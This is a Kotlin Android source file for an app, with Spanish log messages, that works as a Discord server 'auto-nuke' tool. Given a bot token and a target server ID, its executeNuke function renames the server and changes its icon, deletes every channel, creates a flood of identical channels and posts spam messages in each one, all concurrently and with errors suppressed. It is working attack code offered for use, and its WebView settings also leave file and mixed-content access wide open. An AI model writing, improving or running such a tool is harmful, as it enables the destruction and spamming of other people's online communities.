package com.example

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Bundle
import android.util.Base64
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.OnBackPressedCallback
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.InputStream

class MainActivity : ComponentActivity() {

    private lateinit var webView: WebView
    private val PROTECTED_IDS = listOf("1524449604446322708")

    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
        uri?.let {
            val uriString = it.toString()
            val fileName = it.lastPathSegment ?: "server_icon.png"
            webView.evaluateJavascript("window.onImageUriSelected('$uriString', '$fileName')", null)
            Toast.makeText(this, "Foto seleccionada: $fileName", Toast.LENGTH_SHORT).show()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        webView = WebView(this).apply {
            setLayerType(View.LAYER_TYPE_HARDWARE, null)
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                databaseEnabled = true
                allowFileAccess = true
                allowFileAccessFromFileURLs = true
                allowUniversalAccessFromFileURLs = true
                useWideViewPort = true
                loadWithOverviewMode = true
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                cacheMode = WebSettings.LOAD_DEFAULT
            }
            webViewClient = WebViewClient()
            addJavascriptInterface(AndroidBridge(this@MainActivity, this, PROTECTED_IDS), "AndroidBridge")
            loadUrl("file:///android_asset/ui/index.html")
        }

        setContentView(webView)

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.canGoBack()) {
                    webView.goBack()
                } else {
                    finish()
                }
            }
        })
    }

    fun launchImagePicker() {
        pickImageLauncher.launch("image/*")
    }

    class AndroidBridge(private val activity: MainActivity, private val webView: WebView, private val protectedIds: List<String>) {

        @JavascriptInterface
        fun pickServerImage() {
            activity.runOnUiThread {
                activity.launchImagePicker()
            }
        }

        @JavascriptInterface
        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String, imageUriString: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    if (protectedIds.contains(serverId)) {
                        logMsg("[❌] ALERTA DE SEGURIDAD: La ID $serverId está protegida. Operación bloqueada.", "error")
                        return@launch
                    }

                    if (serverId.isEmpty()) {
                        logMsg("[ERROR] Introduce un ID de servidor objetivo válido", "error")
                        return@launch
                    }

                    val client = OkHttpClient()
                    val limit = channelLimit.toIntOrNull() ?: 30
                    val msgLimit = messageLimit.toIntOrNull() ?: 50
                    val jsonMediaType = "application/json; charset=utf-8".toMediaType()

                    logMsg("[BOT] Conectando bot de Discord y verificando servidor ID: $serverId...", "info")

                    // Convert server icon to Base64 data URI if provided
                    var iconBase64: String? = null
                    if (imageUriString.isNotEmpty()) {
                        try {
                            val uri = Uri.parse(imageUriString)
                            val inputStream: InputStream? = activity.contentResolver.openInputStream(uri)
                            val bytes = inputStream?.readBytes()
                            inputStream?.close()
                            if (bytes != null && bytes.isNotEmpty()) {
                                val encoded = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                iconBase64 = "data:image/png;base64,$encoded"
                                logMsg("[+] Imagen de servidor convertida a Base64 correctamente", "success")
                            }
                        } catch (e: Exception) {
                            logMsg("[-] No se pudo procesar la imagen del servidor: ${e.localizedMessage}", "error")
                        }
                    }

                    // 1. Update Server Name & Icon
                    val guildJson = JSONObject().put("name", serverName)
                    if (iconBase64 != null) {
                        guildJson.put("icon", iconBase64)
                    }

                    val patchBody = RequestBody.create(jsonMediaType, guildJson.toString())
                    val patchReq = Request.Builder()
                        .url("https://discord.com/api/v10/guilds/$serverId")
                        .patch(patchBody)
                        .addHeader("Authorization", "Bot $token")
                        .addHeader("Content-Type", "application/json")
                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                        .build()

                    client.newCall(patchReq).execute().use { resp ->
                        if (resp.isSuccessful) {
                            logMsg("[+] Servidor actualizado (Nombre y/o Icono cambiados)", "success")
                        } else {
                            logMsg("[-] No se pudo actualizar el servidor (Código: ${resp.code})", "error")
                        }
                    }

                    // 2. Delete ALL existing channels concurrently
                    logMsg("[*] Eliminando todos los canales existentes...", "info")
                    val getChannelsReq = Request.Builder()
                        .url("https://discord.com/api/v10/guilds/$serverId/channels")
                        .get()
                        .addHeader("Authorization", "Bot $token")
                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                        .build()

                    client.newCall(getChannelsReq).execute().use { chanResp ->
                        if (chanResp.isSuccessful) {
                            val channelsJson = JSONArray(chanResp.body?.string() ?: "[]")
                            val deleteDeferred = (0 until channelsJson.length()).map { i ->
                                async(Dispatchers.IO) {
                                    val ch = channelsJson.getJSONObject(i)
                                    val chId = ch.getString("id")
                                    val chName = ch.getString("name")
                                    try {
                                        val deleteReq = Request.Builder()
                                            .url("https://discord.com/api/v10/channels/$chId")
                                            .delete()
                                            .addHeader("Authorization", "Bot $token")
                                            .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                                            .build()
                                        client.newCall(deleteReq).execute().close()
                                        logMsg("[🗑] Canal eliminado: $chName", "success")
                                    } catch (e: Exception) {
                                        // ignore
                                    }
                                }
                            }
                            deleteDeferred.awaitAll()
                        }
                    }

                    // 3. Create all flood channels concurrently without 123 numbers
                    logMsg("[*] Creando $limit canales de inundación...", "info")
                    val createdChannelIds = mutableListOf<String>()
                    val createDeferred = (0 until limit).map { i ->
                        async(Dispatchers.IO) {
                            try {
                                val chanBody = RequestBody.create(
                                    jsonMediaType,
                                    JSONObject().put("name", channelName).put("type", 0).toString()
                                )
                                val chanReq = Request.Builder()
                                    .url("https://discord.com/api/v10/guilds/$serverId/channels")
                                    .post(chanBody)
                                    .addHeader("Authorization", "Bot $token")
                                    .addHeader("Content-Type", "application/json")
                                    .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                                    .build()

                                client.newCall(chanReq).execute().use { chanResp ->
                                    if (chanResp.isSuccessful) {
                                        val resStr = chanResp.body?.string() ?: "{}"
                                        val chanJson = JSONObject(resStr)
                                        val channelId = chanJson.optString("id")
                                        if (channelId.isNotEmpty()) {
                                            synchronized(createdChannelIds) {
                                                createdChannelIds.add(channelId)
                                            }
                                            logMsg("[+] Canal creado: $channelName", "success")
                                        }
                                    }
                                }
                            } catch (e: Exception) {
                                // ignore
                            }
                        }
                    }
                    createDeferred.awaitAll()

                    // 4. Send spam messages across all channels concurrently with 150ms delay
                    logMsg("[+] Inyectando mensajes de spam...", "info")
                    val spamDeferred = createdChannelIds.map { channelId ->
                        async(Dispatchers.IO) {
                            for (m in 0 until msgLimit) {
                                try {
                                    val msgBody = RequestBody.create(
                                        jsonMediaType,
                                        JSONObject().put("content", messageContent).toString()
                                    )
                                    val msgReq = Request.Builder()
                                        .url("https://discord.com/api/v10/channels/$channelId/messages")
                                        .post(msgBody)
                                        .addHeader("Authorization", "Bot $token")
                                        .addHeader("Content-Type", "application/json")
                                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                                        .build()

                                    client.newCall(msgReq).execute().close()
                                    delay(150)
                                } catch (e: Exception) {
                                    // ignore
                                }
                            }
                        }
                    }
                    spamDeferred.awaitAll()

                    logMsg("[✔] Auto-nuke finalizado con éxito.", "success")
                } catch (e: Exception) {
                    val err = e.localizedMessage?.replace("\"", "\\\"") ?: "Error"
                    logMsg("[❌] ERROR: $err", "error")
                }
            }
        }

        private fun logMsg(msg: String, type: String) {
            val esc = msg.replace("\"", "\\\"").replace("\n", " ")
            activity.runOnUiThread {
                webView.evaluateJavascript("window.appendLog?.('$esc', '$type')", null)
            }
        }

        @JavascriptInterface
        fun showToast(message: String) {
            Toast.makeText(activity, message, Toast.LENGTH_SHORT).show()
        }
    }
}
